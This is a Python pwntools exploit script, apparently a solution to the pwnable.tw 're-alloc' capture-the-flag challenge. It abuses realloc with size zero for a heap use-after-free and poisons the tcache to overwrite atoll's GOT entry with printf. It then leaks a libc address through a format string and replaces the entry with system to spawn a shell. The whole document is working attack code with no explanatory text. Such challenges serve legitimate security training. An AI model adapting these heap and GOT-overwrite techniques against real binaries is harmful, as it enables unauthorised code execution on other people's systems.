# -- coding: utf-8 --
import re
from pwn import *

# ENV
PORT = 10106
HOST = "chall.pwnable.tw"
e = context.binary = ELF('./re-alloc_patched')
# lib = ELF('')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = e.process()


# VARIABLE
def alloc(idx, size, data):
    r.sendlineafter("choice:" ,"1") 
    r.sendlineafter("Index:", str(idx))
    r.sendlineafter("Size:", str(size))
    r.sendlineafter("Data:", data)

def alloc2(idx, size, data):
    r.sendlineafter("choice:" ,"1") 
    r.sendlineafter("Index:", str(idx))
    r.sendlineafter("Size:", str(size))
    r.sendafter("Data:", data)

def realloc2(idx, size, data):
    r.sendlineafter("choice:" ,"2") 
    r.sendlineafter("Index:", str(idx))
    r.sendlineafter("Size:", str(size))
    r.sendafter("Data:", data)
    
def realloc4(idx, data):
    r.sendlineafter("choice:" ,"2") 
    r.sendafter("Index:", '\n')
    r.sendlineafter("Size:", str(idx))
    r.sendafter("Data:", data)

def realloc3(idx):
    r.sendlineafter("choice:" ,"2") 
    r.sendlineafter("Index:", str(idx))
    r.sendlineafter("Size:","0")
    

def realloc(idx, size, data):
    r.sendlineafter("choice:" ,"2") 
    r.sendlineafter("Index:", str(idx))
    r.sendlineafter("Size:", str(size))
    r.sendlineafter("Data:", data)

def free(idx):
    r.sendlineafter("choice:" ,"3") 
    r.sendlineafter("Index:", str(idx))
input()
# PAYLOAD
## STEP 1
alloc(0, 0x18, 'a)')
realloc3(0)
realloc2(0, 0x18, p64(e.got.atoll))

alloc(1, 0x18, 'a')
realloc(1, 0x28, 'a')
free(1)
realloc(0, 0x38, 'a')
free(0)

alloc(0, 0x48, 'a)')
realloc3(0)
realloc2(0, 0x48, p64(e.got.atoll))

alloc(1, 0x48, 'a')
## STEP 2
realloc(1, 0x58, 'a')
free(1)
realloc(0, 0x68, 'a')
free(0)
pause()
## STEP 3
alloc2(0, 0x48, p64(e.plt.printf))

## STEP 4
r.sendlineafter("Your choice:", "3")
r.sendlineafter("Index:", "%7$p")

leak = int(r.recvline().strip(), 16)
info("leak: 0x%x" % leak) 
base = leak - 0x1e5760
info("base: 0x%x" % base)
lib.address = base

## STEP 5
r.sendlineafter("choice:" ,"1") 
r.sendlineafter("Index:", '')
r.sendlineafter("Size:", 'asdfsdfsdfsdf')
r.sendafter("Data:", p64(lib.sym.system))
pause()
## STEP 6
r.sendlineafter("choice:" ,"1") 
r.sendlineafter("Index:", 'sh')


r.interactive()